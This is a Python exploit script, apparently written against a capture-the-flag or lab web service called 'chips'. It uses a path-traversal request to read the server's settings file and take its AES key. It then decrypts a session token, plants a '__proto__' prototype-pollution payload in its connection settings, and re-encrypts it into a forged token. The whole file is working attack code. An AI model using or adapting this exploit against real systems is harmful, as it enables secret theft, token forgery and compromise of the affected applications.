import requests
import base64
import json
from Crypto import Random
from Crypto.Cipher import AES
from secrets import token_bytes
from pprint import pprint
from Crypto.Util.Padding import pad

def get_crypt_key():
	target = "http://chips/files/....//settings/clientOptions.json"
	r = requests.get(target)
	crypt = json.loads(r.text)['crypt']
	return crypt

def decrypt(s):
	a = base64.b64decode(s).decode()
	obj = json.loads(a)
	encoded_iv = obj['iv']
	encoded_value = obj['value']
	print(encoded_value)
	iv = base64.b64decode(encoded_iv)
	ciphertext = base64.b64decode(encoded_value)

	crypt = get_crypt_key()
	# Mode 2 for Cipher-Block Chaining AES_256_CBC
	# Ref: https://pycryptodome.readthedocs.io/en/latest/src/cipher/aes.html

	decipher = AES.new(crypt['key'].encode(), 2, iv)
	pltext = decipher.decrypt(ciphertext).decode()
	while pltext[-1] != '}': pltext = pltext[:-1] # Remove trailing characters behind a }
	obj = json.loads(pltext)

	return obj

def encrypt(obj):
	crypt = get_crypt_key()

	iv = token_bytes(16)
	cipher = AES.new(crypt['key'].encode(), 2, iv)

	pltext = json.dumps(obj)
	padded = pad(pltext.encode(), cipher.block_size)
	crypted = cipher.encrypt(padded)
	
	encoded_value = base64.b64encode(crypted).decode()
	encoded_iv = base64.b64encode(iv).decode()

	obj = {
		'iv': encoded_iv,
		'value': encoded_value
	}
	
	obj_string = json.dumps(obj)
	s = base64.b64encode(obj_string.encode()).decode()

	return s

if __name__ == '__main__':
	obj = decrypt("eyJpdiI6InZYTG5JS0pjOEJCeHp6aHF5S1BWQUE9PSIsInZhbHVlIjoiVWZkNVRLbERnWVdqY1RIeW5Lc0YvYW55TWpXMmtMVEd0U0ZZd1BjZ3ZvdExCZWZ6YjlBTkVuRU9TU1cyNFlSSnJVMjZVMHdyWmVpaE9BSzQ4SDF3cHQxV1IweHVJeWhOSTNINXIyMmZmWUdpYVBmVCtwOFRDYU14Wnk2Tm9QWVVsK1dSYVlGVW54MWwydXhQejcvTGlaM3A1YjVWQlhMbVN0ZFVLZEpBcWRvR0dZSEJyMFpJNnFmVU52emdHbTJ5R3J3cUZSV1NxYnVIdzNFK1U3RWhnRjJ1ZWc5dUFrS3lCU0prNWEvZHB3cytQaThvaHRUSHh0M1oxU2tKdXo5dlQzYTlIZnp1Zm9lblRzQ0xUdUhRcWc9PSJ9")

	pprint(obj)
	obj["connection"]["settings"]["__proto__"] = {
		"toString":"placeholder"
	}
	pprint(obj)

	s = encrypt(obj)
	print()
	print("Printing token...")
	print(s)